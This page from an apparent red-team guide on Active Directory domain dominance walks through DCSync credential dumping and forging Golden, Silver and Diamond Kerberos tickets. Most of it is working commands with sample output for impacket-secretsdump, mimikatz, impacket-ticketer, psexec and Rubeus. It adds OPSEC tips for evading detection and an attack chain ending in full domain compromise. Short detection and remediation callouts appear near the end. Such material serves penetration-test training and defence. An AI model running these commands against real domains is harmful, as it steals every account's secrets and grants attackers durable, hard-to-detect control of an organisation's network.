---
layout: default
title: "DCSync & Golden / Silver / Diamond Ticket"
order: 7
phase: "DOMINANCE"
tactic: "Domain Dominance / Persistence"
summary: "Replicate every domain secret via DCSync, then forge Golden/Silver/Diamond tickets for total, durable domain control."
---

{% include ad_nav.html %}

# DCSync & Golden / Silver / Diamond Ticket

This is the finish line: extract the domain's master keys, then forge Kerberos tickets that grant permanent, self-issued access to anything in the domain.

## Pre-requisites

<div class="badges">
  <span class="badge req">DCSync: DS-Replication rights (DA / Enterprise Admin / delegated)</span>
  <span class="badge req">Golden: the krbtgt NT hash (or AES key) + domain SID</span>
  <span class="badge req">Silver: the target service account hash + SPN + SID</span>
  <span class="badge req">Network access to the DC</span>
</div>

## Part 1 — DCSync (dump all domain secrets)

### Theory

Domain Controllers replicate directory data to each other via **MS-DRSR** (`IDL_DRSGetNCChanges`). Any principal holding the extended rights **DS-Replication-Get-Changes** + **DS-Replication-Get-Changes-All** can *ask a DC to replicate secrets to them* — without logging into the DC or touching `NTDS.dit` on disk. This is granted to Domain Admins, Enterprise Admins, and Administrators by default, and is a frequent ACL-abuse target (BloodHound `DCSync`/`GetChanges` edges).

### Commands

```bash
export DC=10.10.10.100 ; export DOMAIN=corp.local

# Dump EVERYTHING (all users' NTLM hashes + Kerberos keys)
impacket-secretsdump $DOMAIN/administrator:'P@ssw0rd!'@$DC
# With a hash (PtH) or ticket (-k) instead of a password
impacket-secretsdump -k -no-pass administrator@dc01.$DOMAIN
impacket-secretsdump $DOMAIN/administrator@$DC -hashes :31d6cfe0d16ae931b73c59d7e0c089c0

# Just the crown jewel: krbtgt, plus the built-in admin
impacket-secretsdump $DOMAIN/administrator:'P@ssw0rd!'@$DC -just-dc-user krbtgt
impacket-secretsdump $DOMAIN/administrator:'P@ssw0rd!'@$DC -just-dc-user administrator

# NetExec module
nxc smb $DC -u administrator -p 'P@ssw0rd!' -M ntdsutil
```

```terminal
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d7e2b80507ea3b0b1b2f9c0e4a1a9f31:::
administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
corp.local\svc_sql:1104:aad3b435...:a3f1...:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:5c8e...<snip>...b2a
```

```powershell
# mimikatz on a Windows foothold with the right privileges
lsadump::dcsync /domain:corp.local /user:krbtgt
lsadump::dcsync /domain:corp.local /all /csv
```

<div class="img-placeholder">
  <span class="ph-icon">🖼️</span>
  <span class="ph-label">SCREENSHOT PLACEHOLDER</span>
  <span class="ph-desc">secretsdump DRSUAPI output with the krbtgt hash + aes256 key highlighted</span>
</div>

### Get the domain SID (needed to forge tickets)

```bash
impacket-lookupsid $DOMAIN/administrator:'P@ssw0rd!'@$DC 0 | grep 'Domain SID'
nxc smb $DC -u administrator -p 'P@ssw0rd!' --rid-brute | head
```

```terminal
[*] Domain SID is: S-1-5-21-1587369038-3592344992-1298901875
```

## Part 2 — Golden Ticket (forge a TGT as anyone)

### Theory

Every TGT is encrypted/signed with the **krbtgt** account's key. Knowing that key, you can forge a self-signed TGT for **any user** (even non-existent) with **any group memberships** (e.g. RID 512 Domain Admins) and a long lifetime. The KDC trusts it because it validates against krbtgt. This is the ultimate persistence — it survives every password reset *except* rotating krbtgt twice.

### Commands

```bash
export SID=S-1-5-21-1587369038-3592344992-1298901875
export KRBTGT_AES=5c8e...b2a       # prefer AES over RC4
export KRBTGT_NT=d7e2b80507ea3b0b1b2f9c0e4a1a9f31

# Impacket ticketer — forge a Golden TGT for "administrator"
impacket-ticketer -aesKey $KRBTGT_AES -domain-sid $SID -domain $DOMAIN administrator
# (RC4 alternative)
impacket-ticketer -nthash $KRBTGT_NT -domain-sid $SID -domain $DOMAIN administrator

export KRB5CCNAME=administrator.ccache
klist
impacket-psexec -k -no-pass administrator@dc01.$DOMAIN     # SYSTEM on the DC
impacket-secretsdump -k -no-pass administrator@dc01.$DOMAIN
```

```powershell
# mimikatz variant
kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:d7e2b8... /ptt
```

```terminal
[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for corp.local/administrator
[*] Saving ticket in administrator.ccache
```

<div class="callout warning">
  <span class="callout-title">OPSEC on Golden Tickets</span>
  Default mimikatz Golden Tickets can set anomalous lifetimes (10 years) and use RC4 — easy to detect. Use realistic lifetimes and AES keys, or prefer <strong>Diamond Tickets</strong> (below), which are far stealthier.
</div>

## Part 3 — Silver Ticket (forge a TGS for one service)

### Theory

A TGS is encrypted with the **target service account's** key. If you have that account's hash (e.g. a machine account `DC01$`, or a Kerberoasted service), you can forge a TGS **directly to that one service** without ever talking to the KDC — quieter than a Golden Ticket and needs no krbtgt.

```bash
# Forge a CIFS Silver Ticket to a host using its machine-account hash
impacket-ticketer -nthash <TARGET_MACHINE_NT_HASH> -domain-sid $SID -domain $DOMAIN \
  -spn cifs/target.corp.local administrator
export KRB5CCNAME=administrator.ccache
impacket-smbexec -k -no-pass administrator@target.$DOMAIN
```

<div class="callout info">
  <span class="callout-title">Golden vs Silver</span>
  <strong>Golden</strong> = krbtgt key → forge TGT → access to <em>everything</em> (loud, powerful). <strong>Silver</strong> = one service key → forge TGS → access to <em>one service on one host</em> (quiet, targeted, no DC contact, no PAC validation by default).
</div>

## Part 4 — Diamond Ticket (stealthy modern alternative)

### Theory

Instead of forging a TGT from scratch (Golden), you request a **real** TGT from the KDC and then **decrypt/modify/re-encrypt** its PAC using the krbtgt key — adding privileged group SIDs. Because it started as a legitimate KDC-issued ticket, its metadata is consistent and much harder to detect.

```powershell
# Rubeus diamond ticket
.\Rubeus.exe diamond /krbkey:<KRBTGT_AES256> /user:m.rossi /password:Welcome2026! ^
  /domain:corp.local /dc:dc01.corp.local /ticketuser:administrator /ticketuserid:500 /groups:512 /ptt
```

## Complete Attack Chain (finale)

```terminal
[1] arrive here from ANY escalation module:
        ├─ AD CS ESC1/ESC8  ─► administrator / DC01$ TGT
        ├─ ACL abuse (RBCD / DCSync edge) ─► DS-Replication rights
        └─ Lateral Movement ─► DA session stolen from a member server
[2] DCSync:  secretsdump -just-dc-user krbtgt   ─► krbtgt AES key + NT hash
[3] lookupsid                                    ─► Domain SID
[4] Golden Ticket:  ticketer -aesKey <krbtgt> administrator
        KRB5CCNAME=administrator.ccache ─► psexec -k dc01  ─► SYSTEM on DC
[5] Persistence options:
        ├─ Golden Ticket (offline, until krbtgt rotated x2)
        ├─ Silver Tickets to critical services (quiet)
        ├─ Diamond Tickets (stealthy, KDC-consistent)
        └─ AD CS cert persistence (survives password resets)
        ▼
   ██  FULL DOMAIN COMPROMISE  ██
```

<div class="callout danger">
  <span class="callout-title">Remediation reference (report section)</span>
  To evict a Golden Ticket adversary you must rotate the <code>krbtgt</code> password <strong>twice</strong> (with replication in between). Single rotation is insufficient. Also review DS-Replication ACLs, AD CS templates, and remove any rogue machine accounts / RBCD entries created during the attack.
</div>

<div class="callout opsec">
  <span class="callout-title">Detection</span>
  DCSync = <strong>Event ID 4662</strong> with the replication GUIDs from a non-DC principal. Golden/forged tickets = TGS requests (4769) with no preceding TGT request (4768), odd lifetimes, or RC4 in an AES domain. Diamond tickets minimise these tells.
</div>

## Key Takeaways

- DCSync needs only replication rights — not a DC login — and yields every secret including krbtgt.
- Golden = domain-wide forge (krbtgt); Silver = single-service forge (service key); Diamond = stealthy real-ticket tampering.
- Durable persistence = Golden/Diamond tickets + AD CS certificates; remediation requires double krbtgt rotation.

{% include toc_sidebar.html %}
